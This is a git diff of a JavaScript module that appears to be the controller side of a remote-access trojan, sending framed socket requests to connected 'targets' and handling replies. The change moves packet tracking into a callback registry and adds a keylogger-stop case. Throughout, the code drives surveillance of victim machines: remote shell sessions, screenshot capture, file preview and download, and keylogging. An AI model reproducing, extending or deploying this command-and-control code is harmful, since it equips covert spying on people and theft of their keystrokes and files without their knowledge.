@@ -2,14 +2,14 @@ import config from '../config'
 // import { logger } from '../logger'
 import { getCurrentTarget, clientList } from './server'
 import { disconnectTarget } from '../TargetList'
-import { updateKeyLogger } from '../KeyBoard'
+import { updateKeyLogger, stopKeyLogger } from '../KeyBoard'
 import { fileNotFound, updateFilepreview, saveFile } from '../File'
 import { shellConnect, updateShellResponse } from '../Shell'
 import { updateScreenShot } from '../ScreenShot'
+import callback from './callback'
 
 let target = null
 
-var _packetID = 0
 function createRequsetPayload (method, params, Id) {
   var packetID = bufferWrite4(Id)
   var totalLength = 16
@@ -42,9 +42,6 @@ function getMethodID (method) {
   return config.methodID[method]
 }
 
-function getPacketID () {
-  return ++_packetID
-}
 export function sendRequest (method, params = null, timeout = config.connection.RESPONSE_TIMEOUT) {
   return new Promise((resolve, reject) => {
     if (getCurrentTarget() === null) {
@@ -52,7 +49,7 @@ export function sendRequest (method, params = null, timeout = config.connection.
     }
     target = getCurrentTarget()
     let socket = target.socket
-    let packetID = getPacketID()
+    let packetID = callback.register(resolve)
     switch (method) {
       case 'getFilePreview':
         target.filepreviewQueue.push(packetID)
@@ -68,13 +65,13 @@ export function sendRequest (method, params = null, timeout = config.connection.
         break
     }
     let payload = createRequsetPayload(method, params, packetID)
-    resolve(payload)
     console.log(payload)
     console.log(payload.toString())
     // logger.debug(`Sending payload ${payload}`)
     /* Send payload */
     socket.write(payload, () => setTimeout(() => {
       /* Report timeout when not receiving response after a specific timeout */
+      callback.del(packetID)
       reject(new Error('Response timeout'))
     }, timeout))
   })
@@ -93,84 +90,103 @@ function getStatus (statusCode) {
 
 export function processData (data, target) {
   if (data.slice(0, 4).toString() === 'PING') {
+    console.log("shake")
+    console.log(data)
     handshake()
   } else {
-    var packetID = data.slice(0, 4).readInt32LE() 
+    var packetID = data.slice(0, 4).readInt32LE()
     var statusCode = data.slice(4, 8).readInt32LE()
     var totalLength = data.slice(8, 12).readInt32LE()
     var content = data.slice(12, totalLength).toString()
 
-    switch (statusCode) {
-      case 201:
-        shellConnect(target, true)
-        console.log(getCurrentTarget().isShellConnected)
-        break
-      case 202:
-        let index = {
-          'filepreview': target.filepreviewQueue.indexOf(packetID),
-          'screenShot': target.screenShotQueue.indexOf(packetID),
-          'file': target.fileQueue.indexOf(packetID),
-          'command': target.commandQueue.indexOf(packetID)
-        }
-        for (var key in index){
-          if (index[key] !== -1){
-            switch (key) {
-              case 'filepreview':
-                target.filepreviewQueue.shift()
-                if(index[key] === 0) {
-                  updateFilepreview(content)
-                  // console.log(clientList[0].filepreviewQueue)
-                } else {
-                  console.log("packet lost")
-                }
-                break
-              case 'screenShot':
-                target.screenShotQueue.shift()
-                if(index[key] === 0) {
-                  updateScreenShot(content)
-                  // console.log(clientList[0].filepreviewQueue)
-                } else {
-                  console.log("packet lost")
-                }
-                break
-              case 'file':
-                target.fileQueue.shift()
-                if(index[key] === 0) {
-                  saveFile(content)
-                  // console.log(clientList[0].filepreviewQueue)
-                } else {
-                  console.log("packet lost")
-                }
-                break
-              case 'command':
-                target.commandQueue.shift()
-                if(index[key] === 0) {
-                  updateShellResponse(content)
-                  // console.log(clientList[0].filepreviewQueue)
-                } else {
-                  console.log("packet lost")
-                }
-                break
-            }
-            break
+    const cb = callback.get(packetID)
+
+    if (typeof cb !== 'undefined') {
+      callback.del(packetID) // Delete callback when succeeded
+      console.log(`Received packet ${packetID} response`)
+      switch (statusCode) {
+        case 201:
+          shellConnect(target, true)
+          cb(getCurrentTarget().isShellConnected)
+          break
+        case 202:
+          let index = {
+            'filepreview': target.filepreviewQueue.indexOf(packetID),
+            'screenShot': target.screenShotQueue.indexOf(packetID),
+            'file': target.fileQueue.indexOf(packetID),
+            'command': target.commandQueue.indexOf(packetID)
           }
-        }
-        break
-      case 203:
-        updateKeyLogger(content)
-        break
-      case 300:
-        fileNotFound()
-        break
-      case 401:
-        disconnectTarget(target)
-        break
-      case 402:
-        shellConnect(target, false)
-        console.log(getCurrentTarget().isShellConnected)
-        break
-      default:
-        console.log('wrong status code')
+          for (var key in index) {
+            if (index[key] !== -1) {
+              switch (key) {
+                case 'filepreview':
+                  target.filepreviewQueue.shift()
+                  if (index[key] === 0) {
+                    cb(content)
+                    // console.log(clientList[0].filepreviewQueue)
+                  } else {
+                    console.log('packet lost')
+                  }
+                  break
+                case 'screenShot':
+                  target.screenShotQueue.shift()
+                  if (index[key] === 0) {
+                    cb(content)
+                    // console.log(clientList[0].filepreviewQueue)
+                  } else {
+                    console.log('packet lost')
+                  }
+                  break
+                case 'file':
+                  target.fileQueue.shift()
+                  if (index[key] === 0) {
+                    cb(content)
+                    // console.log(clientList[0].filepreviewQueue)
+                  } else {
+                    console.log('packet lost')
+                  }
+                  break
+                case 'command':
+                  target.commandQueue.shift()
+                  if (index[key] === 0) {
+                    cb(content)
+                    // console.log(clientList[0].filepreviewQueue)
+                  } else {
+                    console.log('packet lost')
+                  }
+                  break
+              }
+              break
+            }
+          }
+          break
+        case 203:
+          // updateKeyLogger(content)
+          cb(content)
+          break
+        case 204:
+          // stopKeyLogger(content)
+          cb('keylogger stop')
+          break
+        case 300:
+          // fileNotFound()
+          cb('fileNotFound')
+          break
+        case 401:
+          disconnectTarget(target)
+          cb('disconnectTarget')
+          break
+        case 402:
+          shellConnect(target, false)
+          // console.log(getCurrentTarget().isShellConnected)
+          cb(getCurrentTarget().isShellConnected)
+          break
+        default:
+          cb('wrong status code')
+      }
+    } else {
+      /* If there's no recorded callback, it is timeout or fake */
+      console.log(`Received invalid packet ${packetID}`)
     }
     console.log(packetID)
     // console.log(getStatus(statusCode))
